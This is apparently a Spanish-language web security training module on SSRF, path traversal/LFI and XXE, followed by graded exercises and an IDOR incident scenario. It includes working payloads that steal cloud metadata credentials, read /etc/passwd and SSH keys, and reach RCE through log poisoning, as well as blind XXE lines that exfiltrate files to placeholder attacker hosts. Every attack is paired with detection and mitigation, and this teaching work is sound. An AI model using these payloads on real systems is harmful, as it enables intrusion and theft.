Ataque 5: SSRF (Server-Side Request Forgery)

El servidor hace peticiones HTTP en nombre del atacante

SSRF ocurre cuando la aplicación acepta una URL del usuario y hace una petición desde el servidor. El atacante apunta a recursos internos no accesibles desde Internet: APIs internas, metadata de cloud, bases de datos, o servicios como Redis.

VECTOR TÍPICO:
  GET /fetch?url=https://example.com/image.jpg HTTP/1.1
  → El servidor hace la petición en nombre del usuario

PAYLOAD SSRF — AWS Metadata:
  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
  Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
  → Credenciales IAM completas → acceso a S3, EC2, RDS

PAYLOAD SSRF — Redis sin auth:
  GET /fetch?url=dict://127.0.0.1:6379/info
  → Dump de configuración Redis → SET commands → RCE

BYPASS DE FILTROS:
  Filtro: bloquea "169.254.169.254"
  Bypass: http://169.254.169.254  → http://0xa9fea9fe → http://2852039166
  Bypass: http://evil.com → DNS resuelve a 169.254.169.254 (DNS rebinding)
  Bypass: http://[::ffff:169.254.169.254] (IPv6)

BLIND SSRF:
  Sin respuesta visible — usar Burp Collaborator o interactsh
  El servidor hace la petición pero no devuelve el resultado
  Detectar via: DNS lookup, TCP connect, timing differences

DETECCIÓN:
  WAF: bloquear IPs RFC1918 y 169.254.x.x en parámetros URL
  Logs: peticiones salientes desde servidores de app a IPs internas
  SIEM: EC2 haciendo requests a 169.254.169.254 sin agente legítimo

OWASP Top 10 #10 (2021) · MITRE ATT&CK: T1090 — Proxy · T1552.005 — Cloud Instance Metadata

Ataque 6: Path Traversal / LFI

Acceder a archivos fuera del directorio web raíz

Path Traversal permite navegar fuera del directorio permitido usando secuencias "../". LFI (Local File Inclusion) permite incluir archivos del servidor como código PHP. Ambos pueden escalar a RCE con log poisoning.

PAYLOAD BÁSICO:
  GET /download?file=../../../etc/passwd HTTP/1.1
  → root:x:0:0:root:/root:/bin/bash
  → www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

BYPASS DE FILTROS:
  Filtro: reemplaza "../" con ""  →  ....// (nested)
  Filtro: bloquea "/" absoluto    →  ..%2F..%2Fetc%2Fpasswd
  Filtro: valida extensión .php   →  ../../../etc/passwd%00.php (null byte)
  Filtro: reemplaza solo 1 vez    →  ..././..././etc/passwd

ESCALADA A RCE — Log Poisoning:
  1. Inyectar PHP en User-Agent:
     User-Agent: 
  2. El server guarda el log: /var/log/apache2/access.log
  3. LFI sobre el log:
     GET /page?file=../../../var/log/apache2/access.log&cmd=id
  → uid=33(www-data) gid=33(www-data)  ← RCE conseguido

ARCHIVOS SENSIBLES (Linux):
  /etc/passwd          → usuarios del sistema
  /etc/shadow          → hashes de contraseñas (requiere root)
  /proc/self/environ   → variables de entorno del proceso
  ~/.ssh/id_rsa        → clave privada SSH
  /var/www/html/config.php → credenciales de base de datos

DETECCIÓN:
  WAF: secuencias ../ en parámetros GET/POST
  Logs: accesos a /etc/, /proc/, /var/log/ desde la app web
  SIEM: alerta en GET params con %2e%2e o ../

OWASP A01:2021 · MITRE ATT&CK: T1083 — File and Directory Discovery · T1059 — Command Execution

Ataque 7: XXE — XML External Entity

Entidades XML externas para leer archivos y hacer SSRF

Si el parser XML del servidor no deshabilita entidades externas (XXE), el atacante puede definir entidades que apunten a archivos locales o URLs remotas. El servidor resuelve la entidad e incluye su contenido en la respuesta.

PAYLOAD XXE — File Read:
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root><data>&xxe;</data></root>
  Response: root:x:0:0:root:/root:/bin/bash...

PAYLOAD XXE — SSRF:
  <!ENTITY xxe SYSTEM "http://169.254.169.254/meta-data/">
  → El servidor accede al metadata de AWS en nombre del atacante

OUT-OF-BAND (Blind XXE):
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  → El servidor contacta attacker.com → confirma la vulnerabilidad
  → evil.dtd puede exfiltrar archivos via DNS o HTTP

BILLION LAUGHS (DoS):
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  ... ×10 niveles → 10^10 expansiones → crash del parser

MITIGACIÓN:
  PHP:  libxml_disable_entity_loader(true)
  Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
  Python: defusedxml en lugar de xml.etree
  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit

DETECCIÓN:
  WAF: DOCTYPE, ENTITY, SYSTEM keywords en body XML
  Logs: peticiones salientes inesperadas desde el servidor de app
  SIEM: acceso a file:// o IPs internas desde la capa de aplicación

OWASP A05:2021 · MITRE ATT&CK: T1190 — Exploit Public-Facing Application

EJ-01 HTTP vs HTTPS — ¿qué cambia realmente? Fácil

Sobre HTTP plano un atacante en MITM puede ver: - Credenciales (usuario/contraseña) en texto plano en el body del POST - Cookies de sesión en headers → robo de sesión - Todos los datos del formulario sin cifrar - URLs visitadas (historial de navegación) - Contenido completo de las páginas Sobre HTTPS el atacante solo ve: - El hostname del servidor (en el SNI del TLS handshake) - El tamaño aproximado del tráfico - Los tiempos de conexión NO puede ver: credenciales, cookies, URLs exactas, ni contenido. Riesgo adicional HTTP: modificación del contenido en tránsito → inyección de scripts maliciosos en páginas (MITM activo).
EJ-02 Identifica el tipo de XSS Fácil

REFLECTED XSS: - El payload está en la URL o parámetro de la request - Solo afecta al usuario que hace click en el enlace malicioso - Ejemplo: https://site.com/search?q=<script>alert(1)</script> - El atacante envía ese link por email/phishing STORED XSS (más peligroso): - El payload se guarda en la base de datos del servidor - Afecta a TODOS los usuarios que visiten la página - Ejemplo: publicar un comentario con <script>...</script> → cada usuario que vea ese comentario ejecuta el script - Un solo payload puede robar sesiones de miles de usuarios - Puede persistir indefinidamente hasta que se limpie la DB STORED es más peligroso porque: → No requiere que la víctima haga click en nada especial → Escala a todos los usuarios automáticamente → Puede inyectarse una sola vez y afectar durante días/semanas

EJ-04 Headers de seguridad HTTP — auditoría Medio 

HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc123
Server: Apache/2.4.51
X-Powered-By: PHP/7.4.3
HEADERS AUSENTES O MAL CONFIGURADOS: 1. Set-Cookie: session=abc123 ❌ Falta: HttpOnly → cookie accesible por JS → XSS puede robarla ❌ Falta: Secure → enviada por HTTP también → MITM la ve ❌ Falta: SameSite=Strict → vulnerable a CSRF ✅ Correcto: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict 2. Falta: Strict-Transport-Security (HSTS) → Sin esto: posible downgrade a HTTP ✅ Agregar: Strict-Transport-Security: max-age=31536000; includeSubDomains 3. Falta: X-Frame-Options o frame-ancestors en CSP → Sin esto: clickjacking posible ✅ Agregar: X-Frame-Options: DENY 4. Falta: Content-Security-Policy → Sin esto: XSS puede cargar scripts externos ✅ Agregar: Content-Security-Policy: default-src 'self' 5. Server: Apache/2.4.51 + X-Powered-By: PHP/7.4.3 ⚠️ Information disclosure: expone versiones específicas → Un atacante busca CVEs para esas versiones exactas ✅ Remover o cambiar: Server: webserver / X-Powered-By: (eliminar)

Incidente #HTTP-001: "La tienda que regalaba cuentas"

Son las 2 AM. El SIEM dispara una alerta: 847 requests con status 200 hacia /api/users en los últimos 10 minutos desde la IP 45.129.56.200. El endpoint normalmente devuelve el perfil del usuario autenticado. Logs del proxy: 

02:14:01  GET /api/users?id=1  → 200  {"id":1,"email":"admin@corp.com","role":"admin"}
02:14:02  GET /api/users?id=2  → 200  {"id":2,"email":"user2@corp.com","role":"user"}
02:14:03  GET /api/users?id=3  → 200  {"id":3,"email":"user3@corp.com","role":"user"}
...
02:24:09  GET /api/users?id=847 → 200 {"id":847,"email":"user847@corp.com","role":"user"}
User-Agent: python-requests/2.28.0
Authorization: Bearer eyJhbGc...  (token de usuario legítimo #1042)
CHALLENGE ¿Qué pasó? ¿Cómo respondés? Difícil

(1) VULNERABILIDAD: IDOR (Insecure Direct Object Reference) — OWASP A01:2021 TÉCNICA: Enumeration / Mass Data Harvesting El endpoint /api/users?id=N devuelve datos de CUALQUIER usuario si estás autenticado, sin verificar que el ?id sea el tuyo. El atacante tiene un token legítimo (robado o creado) y enumera todos los IDs secuencialmente con un script Python. (2) IMPACTO: - 847 emails corporativos expuestos - Roles de usuarios expuestos (incluyendo admins) - Posible preparación para phishing dirigido o credential stuffing - Violación de privacidad → potencial obligación de notificación GDPR/legal (3) RESPUESTA INMEDIATA: → Bloquear IP 45.129.56.200 en firewall → Invalidar el token Bearer comprometido (logout forzado del usuario #1042) → Verificar si el usuario #1042 fue comprometido o es el atacante → Preservar logs completos para investigación → Notificar al equipo de desarrollo para parchear el endpoint → Evaluar si hay otros endpoints IDOR con el mismo patrón → Abrir ticket legal/privacidad por datos expuestos (4) PREVENCIÓN: → Authorization check: verificar que el id del token == id solicitado → Rate limiting en la API: máximo N requests/minuto por token → Usar UUIDs en lugar de IDs secuenciales (dificulta enumeración) → Logging + alertas para acceso masivo a recursos de otros usuarios → API security testing en el pipeline CI/CD (OWASP API Top 10)

EJ-07 Path Traversal / LFI: leer /etc/passwd Medio

Una app tiene el endpoint /download?file=report.pdf. ¿Qué payloads de Path Traversal probarías para leer /etc/passwd? ¿Cómo bypassearías un filtro que remueve ../? ¿Qué archivos son más valiosos en un pentest real? ¿Cómo detectarías esto en logs de acceso Apache/Nginx?

PAYLOADS BÁSICOS: /download?file=../../../../etc/passwd /download?file=../../../etc/shadow BYPASSES: • Doble encode: %252e%252e%252f%252e%252e%252f = ../../ • Null byte: ../../../../etc/passwd%00.pdf (PHP <5.3) • Unicode: ..%c0%af..%c0%af = ../.. (IIS antiguo) • Strip bypass: ....//....//etc/passwd (el filtro elimina "../" → queda "../") ARCHIVOS OBJETIVO: Linux: /etc/passwd, /etc/shadow, /proc/self/environ, /proc/self/cmdline ~/.ssh/id_rsa, /var/www/html/.env, /etc/nginx/nginx.conf Windows: C:\Windows\win.ini, C:\inetpub\wwwroot\web.config DETECCIÓN EN LOGS: • access.log: GET /download?file=../../../../etc/passwd → 200 OK • Buscar: "%2e%2e", "../", "..%2F", "%252e" en parámetros de query • SIEM: rule "path_traversal" · umbral: >5 intentos/min desde misma IP • Zeek http.log: uri contains "../" o "%2e%2e"
EJ-08 XXE: extrae /etc/hostname via DOCTYPE Difícil

Una API acepta XML en el body. Escribí un payload XXE que lea /etc/hostname. ¿Cómo harías un XXE ciego (sin respuesta visible)? ¿Qué parser XML es vulnerable por defecto? ¿Cómo mitigas XXE en Java y Python?

PAYLOAD XXE CLÁSICO: <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]> <root><data>&xxe;</data></root> BLIND XXE (sin respuesta visible): <!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd"> %remote; ]> xxe.dtd contiene: <!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % out "...%data;..."> Exfiltración via DNS o HTTP a servidor del atacante PARSERS VULNERABLES POR DEFECTO: • Java: DocumentBuilderFactory, SAXParser • Python: xml.etree.ElementTree, lxml (sin DTD disable) • PHP: SimpleXML, DOMDocument MITIGACIONES: Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) Python: defusedxml.ElementTree.parse(...) # usar defusedxml .NET: XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit } General: deshabilitar DTDs + entidades externas en el parser
